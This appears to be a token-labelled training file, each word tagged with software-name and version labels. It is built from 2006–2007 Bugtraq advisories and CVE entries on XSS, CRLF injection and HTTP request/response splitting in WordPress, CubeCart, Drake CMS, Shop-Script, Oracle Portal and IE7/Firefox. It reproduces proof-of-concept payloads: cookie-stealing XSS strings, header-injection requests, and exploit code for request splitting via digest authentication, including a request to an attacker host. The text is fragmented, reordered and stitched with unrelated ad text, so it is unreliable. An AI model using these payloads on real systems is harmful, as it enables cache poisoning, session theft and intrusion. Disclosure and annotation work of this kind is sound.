Captcha O
! O

All O
vulnerabilities O
were O
reported O
by O
MustLive O
( O
1 O
. O

Dear O
bugtraq O
, O
Below O
is O
a O
digest O
of O
vulnerabilities O
published O
by O
and O
believed O
to O
be O
previously O
unpublished O
in O
English O
. O

Wordpress O
multiple O
security O
vulnerabilities O
: O
2.1 O
information O
disclosure O
( O
WordPress O
2.2/2.3 O
) O
Invalid O
request O
disclosures O
database O
structure O
and O
local O
paths O
: O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
2.2 O
crossite O
scripting O
( O
WordPress O
< O
= O
2.0.9 O
) O
lert O
( O
document.cookie O
) O
) O
% O
22 O
on O
( O
alert O
( O
document.cookie O
) O
) O
% O
22 O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
2.3 O
Directory O
traversal O
, O
Arbitrary O
file O
deletion O
, O
Denial O
of O
Service O
and O
Cross-Site O
Scripting O
via O
wp-db-backup.php O
Directory O
Traversal O
( O
WordPress O
< O
= O
2.0.3 O
) O
: O
ss O
ess O
Arbitrary O
file O
deletion O
and O
DoS O
( O
WordPress O
< O
= O
2.0.3 O
) O
: O
ss O
ess O
hp O
php O
XSS O
( O
WordPress O
< O
= O
2.0.11 O
and O
potentially O
2.1.x O
, O
2.2.x O
, O
2.3.x O
) O
: O
lert O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
2.4 O
Local O
file O
include O
, O
Directory O
traversal O
and O
Full O
path O
disclosure O
( O
WordPress O
< O
= O
2.0.11 O
and O
potentially O
2.1.x O
, O
2.2.x O
, O
2.3.x O
) O
Full O
path O
disclosure O
: O
Local O
file O
include O
and O
Directory O
traversal O
: O
Arbitrary O
file O
edit O
: O
Attacks O
with O
backslash O
are O
possible O

ExpressionEngine SN
< SV
= SV
1.2.1 SV
response O
splitting O
and O
crossite O
scripting O
cument.cookie O
) O
% O
3C/script O
% O
3E O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
There O
are O
also O
few O
vulnerabilities O
published O
in O
English O
as O
a O
part O
of O
the O
Month O
of O
Bugs O
in O
CAPTCHA O
: O
Cryptographp SN
< SV
= SV
1.2 SV
WordPress O
plugin O
multiple O
persistant O
crossite O
scriptings O
Original O
article O
: O
XSS O
in O
Math O

AwesomeTemplateEngine O
Crossite O
scripting O
Multiple O
crossite O
scripting O
( O
require O
register_globvals O
) O
: O
ript O
% O
3Ealert O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
rt O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
t O
% O
3Ealert O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
script O
% O
3Ealert O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
lert O
( O
document.cookie O
) O
% O
3C/script O
% O
3E O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
2 O
. O

Persistant O
crossite O
scripting O
and O
request O
forgery O
in O
WP-ContactForm SN
< SV
= SV
1.5 SV
alpha SV
( O
WordPress O
plugin O
) O
POST O
request O
to O
php O
with O
different O
form O
fields O
. O

Original O
article O
( O
in O
Russian O
) O
: O
Additional O
detail O
( O
in O
Ukrainian O
) O
: O
3 O
. O

securityvulns.com O
russian O
vulnerabilities O
digest O

CRLF O
injection O
vulnerability O
in O
Mortbay SN
Jetty SN
before SV
6.1.6rc0 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
index.php O
in O
Drake SN
CMS SN
0.4.0 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
lang O
parameter O
. O

NOTE O
: O
Drake O
CMS O
has O
only O
a O
beta O
version O
available O
, O
and O
the O
vendor O
has O
previously O
stated O
We O
do O
not O
consider O
security O
reports O
valid O
until O
the O
first O
official O
release O
of O
Drake O
CMS O
. O

Drake SN
CMS SN
( O
v0.4.0 SV
) O
- O
CRLF O
Injection O
Vulnerability O

Vulnerable O
files O
: O
index.php O
HTTP O
Request O
: O
POST O
/index.php O
lang= O
% O
0d O
% O
0aINJECTEDHEADER O
% O
3Ainjecteddata O
HTTP/1.0 O
Accept O
: O
Content-Type O
: O
application/x-www-form-urlencoded O
User-Agent O
: O
Browser/1.0 O
( O
compatible O
; O
MSIE O
6.0 O
; O
Windows O
NT O
5.0 O
; O
.NET O
CLR O
1.1.4322 O
) O
Host O
: O
drakecms.sourceforge.net O
Content-Length O
: O
121 O
Cookie O
: O
PHPSESSID=510885055 O
; O
user_lang=sk O
Connection O
: O
Close O
Pragma O
: O
no-cache O
PHPSESSID=510885055 O
& O
username=111-222-1933email O
( O
at O
) O
address O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
& O
password=111- O
222-1933email O
( O
at O
) O
address O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
& O
task=login O
& O
remember=off O
HTTP O
Response O
: O
HTTP/1.1 O
200 O
OK O
Date O
: O
Sun O
, O
06 O
May O
2007 O
01:20:14 O
GMT O
Server O
: O
Apache/1.3.33 O
( O
Unix O
) O
PHP/4.3.10 O
X-Powered-By O
: O
PHP/4.3.10 O
Set-Cookie O
: O
PHPSESSID=510885055 O
; O
path= O
Expires O
: O
Thu O
, O
19 O
Nov O
1981 O
08:52:00 O
GMT O
Cache-Control O
: O
no-store O
, O
no-cache O
, O
must-revalidate O
, O
post-check=0 O
, O
pre-check=0 O
Pragma O
: O
no-cache O
Set-Cookie O
: O
user_lang=deleted O
; O
expires=Sat O
, O
06-May-06 O
01:20:13 O
GMT O
Content-Language O
INJECTEDHEADER O
: O
injecteddata O
Connection O
: O
close O
Content-Type O
: O
text/html O
; O
charset=UTF-8 O

Vulnerable O
: O
v0.4.0 SV
( O
others O
may O
also O
be O
affected O
) O
Google O
d0rk O
: O
Powered O
by O
Drake O
CMS O
John O
Martinelli O
john O
( O
at O
) O
martinelli O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
May O
5th O
, O
2007 O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
Devellion SN
CubeCart SN
3.0.15 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
a O
cookie O
name O
beginning O
with O
ccSID O
to O
( O
1 O
) O
cart.php O
or O
( O
2 O
) O
index.php O
. O

Note O
to O
BugTraq O
: O
Forgot O
to O
tell O
which O
files O
are O
vulnerable O
. O

CubeCart SN
( O
v3.0.15 SV
) O
- O
CRLF O
Injection O
Vulnerability O
It O
is O
possible O
to O
set O
the O
cookie O
( O
prefixed O
with O
ccSID O
) O
to O
cause O
CRLF O
injection O
. O

Vulnerable O
files O
: O
cart.php O
, O
index.php O
HTTP O
Request O
: O
GET O
HTTP/1.0 O
Accept O
: O
User-Agent O
: O
Browser/1.0 O
( O
compatible O
; O
MSIE O
6.0 O
; O
Windows O
NT O
5.0 O
; O
.NET O
CLR O
1.1.4322 O
) O
Host O
: O
Cookie O
: O
ccSIDb05df7533e9e599e942866426123cbfb= O
% O
0d O
% O
0aINJECTED-HEADER O
% O
3Ainjected-d O
ata O
; O
ccUser=ZTYwNjY1YWEyMTE5MDc4NTJhYmY0Yjk5NjQ1NjAyZmQ O
% O
253D O
Connection O
: O
Close O
Pragma O
: O
no-cache O
HTTP O
Response O
: O
HTTP/1.1 O
200 O
OK O
Date O
: O
Sat O
, O
05 O
May O
2007 O
22:02:26 O
GMT O
Server O
: O
Apache/2.0.59 O
( O
Unix O
) O
X-Powered-By O
: O
PHP/5.0.4 O
Set-Cookie O
: O
ccSIDb05df7533e9e599e942866426123cbfb= O
INJECTED-HEADER O
: O
injected-data O
Expires O
: O
Thu O
, O
19 O
Nov O
1981 O
08:52:00 O
GMT O
Cache-Control O
: O
no-store O
, O
no-cache O
, O
must-revalidate O
, O
post-check=0 O
, O
pre-check=0 O
Pragma O
: O
no-cache O
Set-Cookie O
: O
ccUser=YTk4YmIxMjI0YmYwYWRmM2NhMjkzNmFlNTZhMjJmNzk O
% O
3D O
; O
expires=Mon O
, O
07 O
May O
2007 O
22:02:26 O
GMT O
Connection O
: O
close O
Content-Type O
: O
text/html O
; O
charset=ISO-8859-1 O

Vulnerable O
: O
v3.0.15 SV
( O
others O
may O
also O
be O
affected O
) O
Google O
d0rk O
: O
Powered O
by O
CubeCart O
John O
Martinelli O
john O
( O
at O
) O
martinelli O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
May O
5th O
, O
2007 O

UPDATED O
: O
CubeCart SN
( O
v3.0.15 SV
) O
- O
CRLF O
Injection O
Vulnerability O

remove O
possible O
CRLF O
injection O
$ O
sessId O
= O
str_replace O
( O
array O
( O
% O
0d O
, O
% O
0a O
sessId O
) O
; O
Please O
report O
any O
potential O
security O
issues O
directly O
to O
us O
in O
the O
future O
rather O
than O
making O
them O
public O
immediately O
. O

3.0.16 O
will O
be O
released O
later O
today O
. O

Simple O
str_replace O
to O
fix O
in O
includes/session.inc.php O
and O
treatGet O
function O
on O
$ O
_GET O
[ O
ccUser O
] O
. O

Re O
: O
UPDATED O
: O
CubeCart SN
( O
v3.0.15 SV
) O
- O
CRLF O
Injection O
Vulnerability O

NOTE O
: O
this O
can O
be O
leveraged O
for O
cross-site O
scripting O
( O
XSS O
) O
attacks O
. O

CRLF O
injection O
vulnerability O
in O
CFNetwork O
on O
Apple SN
Mac SN
OS SN
X SN
10.3.9 SV
and SV
10.4.10 SV
before SV
20070731 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
an O
unspecified O
context O
. O

CRLF O
injection O
vulnerability O
in O
the O
Digest O
Authentication O
support O
for O
Microsoft SN
Internet SN
Explorer SN
7.0.5730.11 SV
allows O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
LF O
( O
% O
0a O
) O
in O
the O
username O
attribute O
. O

Title O
IE SN
7 SV
and O
Firefox O
Browsers O
Digest O
Authentication O
Request O
Splitting O
Systems O

But O
for O
some O
more O
attack O
have O
a O
look O
at O
references O
. O

Rfc O
uses O
the O
following O
example O
: O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
The O
first O
time O
the O
client O
requests O
the O
document O
, O
no O
Authorization O
header O
is O
sent O
, O
so O
the O
server O
responds O
with O
: O
HTTP/1.1 O
401 O
Unauthorized O
WWW-Authenticate O
: O
Digest O
realm= O
testrealm O
( O
at O
) O
host O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
, O
qop= O
auth O
, O
auth-int O
, O
nonce= O
dcd98b7102dd2f0e8b11d0f600bfb0c093 O
, O
opaque= O
5ccc069c403ebaf9f0171e9517f40e41 O
The O
client O
may O
prompt O
the O
user O
for O
the O
username O
and O
password O
, O
after O
which O
it O
will O
respond O
with O
a O
new O
request O
, O
including O
the O
following O
Authorization O
header O
: O
Authorization O
: O
Digest O
username= O
Mufasa O
, O
realm= O
testrealm O
( O
at O
) O
host O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
, O
nonce= O
dcd98b7102dd2f0e8b11d0f600bfb0c093 O
, O
uri= O
/dir/index.html O
, O
qop=auth O
, O
nc=00000001 O
, O
cnonce= O
0a4f113b O
, O
response= O
6629fae49393a05397450978507c4ef1 O
, O
opaque= O
5ccc069c403ebaf9f0171e9517f40e41 O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
So O
there O
a O
response O
by O

For O
more O
Informations O
about O
Dual O
Licensing O
: O
Permission O
is O
granted O
for O
the O
redistribution O
of O
this O
alert O
electronically O
. O

It O
may O
not O
be O
edited O
in O
any O
way O
without O
my O
express O
written O
consense O
. O

BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.3 O
( O
GNU/Linux O
) O
iD8DBQBGL5HWfSCEH5yFF2MRAgVfAJ47gkj/Yw0HFSzizk4Hi+AWe5aiQgCbBfTQ O
Pyi025+kLyUB6oT1919PDi4= O
=cwhV O
END O
PGP O
SIGNATURE O

III O
) O
Direct O
URL O
Authentication O
Let O
try O
it O
with O
Firefox O
: O
< O
img O
id= O
d O
src= O
Let O
see O
what O
happens O
after O
the O
first O
request O
: O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
HTTP/1.1 O
401 O
Authorization O
Required O
Set-Cookie O
: O
PHPSESSID=6555 O
WWW-Authenticate O
: O
Digest O
realm= O
1 O
( O
at O
) O
example O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
, O
qop= O
auth O
, O
auth-int O
, O
nonce= O
dcd98b7102dd2f0e8b11d0f600bfb0c093 O
, O
opaque= O
5 O
ccc069c403ebaf9f0171e9517f40e41 O
Proxy-Connection O
: O
keep-alive O
Connection O
: O
keep-alive O
, O
Keep-Alive O
Content-Length O
: O
146 O
Keep-Alive O
: O
timeout=15 O
, O
max=100 O
Content-Type O
: O
text/html O
; O
charset=UTF-8 O
... O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
and O
then O
Firefox O
resend O
its O
request O
: O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
GET O
req.php O
HTTP/1.1 O
Host O
: O
at.tack.er O

What O
you O
could O
do O
with O
these O
splittings O

, O
false O
, O
user O
name O
, O
pass O
) O
; O
x.setRequestHeader O
( O
Proxy-Connection O
, O
keep-alive O
) O
; O
x.onreadystatechange=function O
( O
) O
{ O
if O
( O
x.readyState O
4 O
The O
payload O
with O
a O
request O
to O
a O
page O
with O
evil O
content O
x.send O
( O
RequestPayload O
) O
; O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
This O
will O
result O
in O
a O
similar O
splitting O
like O
the O
one O
with O
images O
tags O
. O

There O
are O
two O
ways O
to O
send O
credentials O
in O
html/javascript O
: O
XMLHttpRequest O
( O
GET O
, O
page O
, O
async O
, O
user O
, O
pass O
) O
; O
And O
with O
img/iframes O
or O
related O
: O
< O
img O
src= O
But O
what O
if O
the O
username O
contains O
or O
urlencoded O
% O
0d O
% O
0a O

LEGAL O
NOTICES O
Copyright O
( O
c O
) O
2007 O
Stefano O
di O
Paola O
Note O
: O
this O
exploit O
is O
DUAL O
LICENSED O
, O
1. O
if O
you O
ll O
use O
it O
for O
personal O
and O
non-profit O
purposes O
you O
can O
apply O
GPL O
v2 O
and O
above O
. O

If O
anyone O
wants O
to O
know O
about O
HTTP O
Request O
Splitting O
, O
HTTP O
Request O
Splitting O
attacks O
are O
described O
in O
various O
papers O
and O
advisories O
: O
1 O
. O

Note O
: O
Internet O
Explorer O
7 O
is O
not O
vulnerable O
with O
imgs O
nor O
with O
other O
direct O
requests O
. O

Or O
by O
using O
various O
redirectors O
around O
the O
web O
. O

The O
rest O
of O
the O
story O
is O
straightforward O
, O
an O
attacker O
could O
inject O
a O
second O
request O
, O
and O
in O
presence O
of O
a O
proxy O
( O
about O
2 O
million O
people O
use O
it O
) O
, O
a O
request O
splitting O
attack O
could O
be O
accomplished O
. O

< O
html O
> O
< O
head O
< O
meta O
http-equiv= O
Connection O
content= O
keep-alive O
> O
< O
/head O
< O
body O
> O
< O
script O
Some O
Printing O
in O
order O
to O
show O
document O
DOM O
properties O
in O
the O
poisoned O
page O
for O
( O
var O
i O
in O
document O
) O
document.write O
( O
i+ O
+eval O
( O
document O
. O

A O
lot O
, O
one O
for O
all O
is O
that O
in O
presence O
of O
a O
proxy O
, O
local O
cache O
could O
be O
poisoned O
. O

II O
) O
Long O
description O
As O
explained O
in O
Rfc2617 O
( O
Digest O
Authentication O
is O
a O
more O
secure O
way O
to O
exchange O
user O
credentials O
. O

Note O
: O
there O
is O
some O
difference O
between O
IE O
and O
Firefox O
, O
but O
i O
ll O
let O
you O
as O
homework O
CREDIT O
Stefano O
di O
Paola O
is O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

( O
About O
Auto O
Injection O
with O
Req.Split O
. O
) O

Let O
use O
an O
Evil O
page O
like O
this O
: O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
< O
php O
header O
( O
Set-Cookie O
: O
PHPSESSID=6555 O
) O
; O
if O
( O
( O
int O
) O
intval O
( O
$ O
_COOKIE O
[ O
PHPSESSID O
] O
) O
! O

IV O
) O
Firefox O
Add-On O
A O
redirection O
could O
be O
used O
: O
< O
img O
src= O
With O
redir.php O
: O
< O
php O
header O
( O
Location O
: O

Let O
use O
a O
standard O
request O
with O
XMLHttpRequest O
: O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
x=new O
XMLHttpRequest O
( O
) O
; O
x.open O
( O
POST O
, O
req.php O

6555 O
) O
{ O
header O
( O
HTTP/1.0 O
401 O
Authorization O
Required O
) O
; O
header O
( O
WWW-Authenticate O
: O
Digest O
realm= O
1 O
( O
at O
) O
example O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
, O
qop= O
auth O
, O
auth-int O
, O
nonce= O
dcd98b7102dd2f0e8b11d0f600bfb0c093 O
, O
opaque= O
5ccc069c403ebaf9f0171 O
e9517f40e41 O
) O
; O
header O
( O
Proxy-Connection O
: O
keep-alive O
else O
{ O
header O
( O
Set-Cookie O
: O
PHPSESSID=0 O
) O
; O
} O
header O
( O
Connection O
: O
keep-alive O
) O
; O

+i O
) O
+ O
< O
br O
script O
< O
/body O
< O
/html O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
8 O
< O
Which O
asks O
for O
a O
digest O
authentication O
only O
once O
. O

V O
) O
XMLHttpRequest O
Authentication O
IE SN
7 SV
and O
Firefox O
are O
both O
vulnerable O
. O

Affected O
Internet SN
Explorer SN
7.0.5730.11 SV
FF O
2.0.0.3 O
Severity O
Medium O

... O
oOOo O
... O
oOOo O
... O
. O
Stefano O
Di O
Paola O
Software O
& O
Security O
Engineer O
Web O
: O

Vendor O
& O
Advisory O
Authors O
Stefano O
`Wisec` O
Di O
Paola O
( O
stefano.dipaola O
( O
at O
) O
wisec O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
) O
Discovery O
Date O
20070213 O
Release O
Date O
20070425 O
I O
) O
Short O
description O
Firefox O
and O
Internet O
Explorer O
are O
prone O
to O
Http O
Request O
Splitting O
when O
Digest O
Authentication O
occurs O
. O

In O
the O
case O
you O
plain O
to O
: O
a. O
use O
our O
code O
in O
any O
commercial O
context O
b. O
implement O
this O
code O
in O
your O
non-GPL O
application O
c. O
use O
this O
code O
during O
a O
Penetration O
Test O
d. O
make O
any O
profit O
from O
it O
you O
need O
to O
contact O
me O
in O
order O
to O
obtain O
a O
_commercial O
license_ O
. O

IE SN
7 SV
and O
Firefox O
Browsers O
Digest O
Authentication O
Request O
Splitting O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
before SV
6.0.2.19 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
single O
CRLF O
sequence O
in O
a O
context O
that O
is O
not O
a O
valid O
multi-line O
header O
. O

CRLF O
injection O
vulnerability O
in O
Adobe SN
Acrobat SN
Reader SN
before SV
8.0.0 SV
, O
when O
used O
with O
the O
Microsoft.XMLHTTP O
ActiveX O
object O
in O
Internet O
Explorer O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
javascript O
: O
URI O
in O
the O
( O
1 O
) O
FDF O
, O
( O
2 O
) O
XML O
, O
or O
( O
3 O
) O
XFDF O
AJAX O
request O
parameters O
. O

NOTE O
: O
this O
issue O
can O
be O
leveraged O
for O
XSS O
attacks O
. O

CRLF O
injection O
vulnerability O
in O
lib/exe/fetch.php O
in O
DokuWiki SN
2006-03-09e SV
, O
and SV
possibly SV
earlier SV
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
media O
parameter O
. O

NOTE O
: O
the O
calendar.jsp O
vector O
is O
covered O
by O
CVE-2006-6697 O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
Oracle SN
Portal SN
9.0.2 SV
and O
possibly O
other O
versions O
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
enc O
parameter O
to O
( O
1 O
) O
calendarDialog.jsp O
or O
( O
2 O
) O
fred.jsp O
. O

The O
offending O
code O
is O
String O
enc O
= O
request.getParameter O
( O
enc O
) O
; O
if O
( O
( O
enc O
null O
equals O
( O
enc O
) O
) O
response.setContentType O
( O
text/html O
) O
; O
else O
response.setContentType O
( O
text/html O
; O
charset= O
+ O
enc O
) O
; O
which O
can O
be O
commented O
out O
as O
follows O
: O
String O
enc O
= O
request.getParameter O
( O
enc O
) O
; O
if O
( O
( O
enc O
null O
equals O
( O
enc O
) O
) O
response.setContentType O
( O
text/html O
) O
; O
else O
response.setContentType O
( O
text/html O
; O
charset= O
+ O
enc O
) O
; O

This O
also O
occurs O
in O
Portal SN
9.0.2 SV
in O
the O
file O
calendar.jsp O
, O
calendarDialog.jsp O
, O
and O
fred.jsp O
, O
all O
of O
which O
are O
under O
the O
$ O
ORACLE_HOME/j2ee O
directory O
in O
various O
locations O
. O

Re O
: O
Oracle O
Portal O
10g O
HTTP O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
webapp/jsp/calendar.jsp O
in O
Oracle SN
Portal SN
10g SV
and SV
earlier SV
, O
including SV
9.0.2 SV
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
enc O
parameter O
. O

It O
can O
be O
used O
in O
attack O
to O
rogue O
cookies O
, O
usernames O
and O
passwords O
, O
etc O
... O
Patch O
Information O
There O
is O
no O
patch O
at O
moment O
. O

Oracle O
Portal/Applications O
HTTP O
Response O
Splitting O
Sample O
: O
th=12 O
% O
0d O
% O
0a O
% O
0d O
% O
0a O
% O
3Cscript O
% O
3Ealert O
( O
hi O
) O
% O
3C/script O
% O
3E O
How O
an O
attack O
can O
be O
conducted O

Desc O
xc3 O
xa1rgalo O
y O
pru O
xc3 O
xa9balo O
2 O
meses O
gratis O
. O

sdivertidos O

Due O
to O
the O
related O
problem O
a O
malicious O
user O
can O
alter O
the O
content O
that O
the O
server O
will O
catch O
. O

Otherwise O
, O
wait O
for O
a O
long O
while O
an O
official O
patch O
( O
between O
6 O
months O
and O
2 O
years O
) O
. O

Oracle O
Portal O
is O
commonly O
used O
with O
Oracle O
Web O
Cache O
, O
which O
caches O
the O
most O
common O
used O
URLs O
. O

Workaround O
Edit O
yourself O
calendar.jsp O
file O
and O
fix O
it O
, O
in O
about O
5 O
seconds O
. O

Thanks O
to O
n0oN3 O
Acepta O
el O
reto O
MSN O
Premium O
: O
Correos O
m O
xc3 O
xa1s O
divertidos O
con O
fotos O
y O
textos O
incre O
xc3 O
xadbles O
en O
MSN O
Premium O
. O

Oracle O
Portal O
10g O
HTTP O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
premium/index.php O
in O
Shop-Script O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
( O
1 O
) O
links_exchange O
, O
( O
2 O
) O
news O
, O
( O
3 O
) O
search_with_change_category_ability O
, O
( O
4 O
) O
logging O
, O
( O
5 O
) O
feedback O
, O
( O
6 O
) O
show_price O
, O
( O
7 O
) O
register O
, O
( O
8 O
) O
answer O
, O
( O
9 O
) O
productID O
, O
and O
( O
10 O
) O
inside O
parameters O
. O

HTTP O
Response O
Splitting O
enables O
an O
attacker O
to O
alter O
the O
HTTP O
response O
header O
structure O
which O
can O
leads O
to O
various O
range O
of O
attacks O
such O
as O
web O
cache O
poisoning O
, O
temporary O
defacement O
, O
hijacking O
pages O
or O
cross-site O
scripting O
( O
XSS O
) O
. O

This O
happens O
since O
the O
user O
input O
is O
injected O
into O
the O
value O
section O
of O
http O
header O
without O
properly O
escaping/removing O
CRLF O
characters O
which O
can O
leads O
to O
two O
HTTP O
responses O
instead O
of O
one O
response O
. O

Vendor O
: O
Shop-Script O
( O
a O
division O
of O
WebAsyst O
LLC O
) O
Application O
: O
Shop-Script O
( O
) O
I. O
Descriptions O
: O
Shop-Script O
is O
a O
PHP O
based O
shopping O
cart O
. O

Multiple O
links O
of O
shop-script O
are O
vulnerable O
to O
a O
new O
form O
of O
application O
attack O
technique O
called O
HTTP O
Response O
splitting O
( O
aka O
CRLF O
Injection O
) O
. O

V. O
Reference O
: O
VI O
. O

Credits O
: O
Debasis O
Mohanty O
( O
aka O
Tr0y O
) O
For O
more O
vulnerabilities O
visit O
- O

Proof-of-concept O
: O
[ O
Request O
Header O
] O
POST O
/premium/index.php O
links_exchange= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
Accept O
: O
Content-Type O
: O
application/x-www-form-urlencoded O
User-Agent O
: O
Mozilla/4.0 O
( O
compatible O
; O
MSIE O
6.0 O
; O
Windows O
NT O
5.0 O
; O
.NET O
CLR O
1.1.4322 O
) O
Host O
: O
Content-Length O
: O
18 O
Cookie O
: O
PHPSESSID=e0d1c748db4ce6fa7886403e65458aaa O
Connection O
: O
Close O
Pragma O
: O
no-cache O
current_currency=1 O
[ O
Response O
Header O
] O
HTTP/1.1 O
302 O
Found O
Date O
: O
Mon O
, O
16 O
Oct O
2006 O
17:39:57 O
GMT O
Server O
: O
Apache O
Expires O
: O
Thu O
, O
19 O
Nov O
1981 O
08:52:00 O
GMT O
Cache-Control O
: O
no-store O
, O
no-cache O
, O
must-revalidate O
, O
post-check=0 O
, O
pre-check=0 O
Pragma O
: O
no-cache O
Location O
: O
index.php O
links_exchange= O
FakeHeader O
: O
Fake_Custom_Header O
< O
= O
[ O
Custome O
remsponse O
injected O
by O
the O
attacker O
] O
Content-Length O
: O
0 O
Connection O
: O
close O
Content-Type O
: O
text/html O
IV O
. O

Remediation O
: O
Sanitize O
CR O
( O
0x13 O
) O
and O
LF O
( O
0x10 O
) O
from O
the O
user O
input O
or O
properly O
encode O
the O
output O
in O
order O
to O
prevent O
the O
injection O
of O
custom O
HTTP O
headers O
. O

Affected O
Links O
: O
POST O
/premium/index.php O
links_exchange= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
news= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
search_with_change_category_ability= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
logging= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
feedback= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
show_price= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
register= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
answer= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
& O
save_v O
oting_results=yes O
HTTP/1.0 O
POST O
/premium/index.php O
productID= O
% O
0d O
% O
0aFakeHeader O
: O
Fake_Custom_Header O
HTTP/1.0 O
POST O
/premium/index.php O
searchstring= O
< O
any_keyword O
> O
& O
inside= O
% O
0d O
% O
0aFakeHeade O
r O
: O
Fake_Custom_Header O
HTTP/1.0 O
III O
. O

Multiple O
HTTP O
